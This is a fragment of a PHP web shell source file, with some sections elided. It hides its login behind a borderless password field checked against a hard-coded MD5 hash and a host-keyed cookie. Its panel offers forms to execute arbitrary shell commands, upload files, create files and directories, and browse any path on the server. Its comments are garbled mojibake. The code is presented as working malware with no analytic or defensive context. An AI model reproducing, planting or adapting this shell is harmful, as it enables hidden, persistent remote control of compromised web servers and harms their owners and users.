...
$config = "7d5efa1aea4a0b1ad970f3a79ccd22aa";
function ASGLogin() {
	die("<form method=post><input style='border: none' type=text name=config></form>");
}

if(isset($_POST['config']) && (md5($_POST['config']) == $config))
    ASGsetcookie(md5($_SERVER['HTTP_HOST']), $config);

if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $config))
    ASGLogin();
...
function RecursFile($dir) {
	...
	clearstatcache(); // Р“вЂ”Р“РЃР“В±Р“Р†Р“РЃР“В¬ Р“Р„Р“ТђР“С‘
	$realpath = getcwd(); // Р“вЂР“В®Р“ВµР“В°Р“В Р“В­Р“С—Р“ТђР“В¬ Р“Р†Р“ТђР“Р„Р“С–Р“в„–Р“РЃР“В© Р“Р‡Р“С–Р“Р†Р“С
	$handle = @opendir($dir);
	if(FALSE === $handle) {
		return false;
	}
...
echo '</td></tr></table><a bookmark="minipanel"><br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>

<tr><td width="50%" height="1" valign="top"><center><b>Enter</b><form method="POST"><input type=hidden name=act value="cmd"><input type=hidden name="d" value="'.$dispd.'"><input type="text" name="cmd" size="50" value=""><input type=hidden name="cmd_txt" value="1">&nbsp;<input type=submit name=submit value="Execute"></form></td><td width="50%" height="1" valign="top"><center><b>Upl</b><form method="POST" name="tod" ENCTYPE="multipart/form-data"><input type=hidden name=act value="upload"><input type=hidden name="d" value="'.$dispd.'"><input type="file" name="uploadfile"><input type=submit name=submit value="Upload"><br>'.$wdt.'</form></center></td></tr></TABLE>
<br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center><b>Make Dir</b><form method="POST"><input type=hidden name=act value="mkdir"><input type=hidden name="d" value="'.$dispd.'"><input type="text" name="mkdir" size="50" value="'.$dispd.'">&nbsp;<input type=submit value="Create"><br>'.$wdt.'</form></center></td><td width="50%" height="1" valign="top"><center><b>Make File</b><form method="POST"><input type=hidden name=act value="mkfile"><input type=hidden name="d" value="'.$dispd.'"><input type="text" name="mkfile" size="50" value="'.$dispd.'"><input type=hidden name="ft" value="edit">&nbsp;<input type=submit value="Create"><br>'.$wdt.'</form></center></td></tr></table>
<br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center><b>:: Go Dir ::</b><form method="POST"><input type=hidden name=act value="ls"><input type="text" name="d" size="50" value="'.$dispd.'">&nbsp;<input type=submit value="Go"></form></center></td><td width="50%" height="1" valign="top"><center><b>:: Go File ::</b><form method="POST""><input type=hidden name=act value="gofile"><input type=hidden name="d" value="'.$dispd.'"><input type="text" name="f" size="50" value="'.$dispd.'">&nbsp;<input type=submit value="Go"></form></center></td></tr></table>
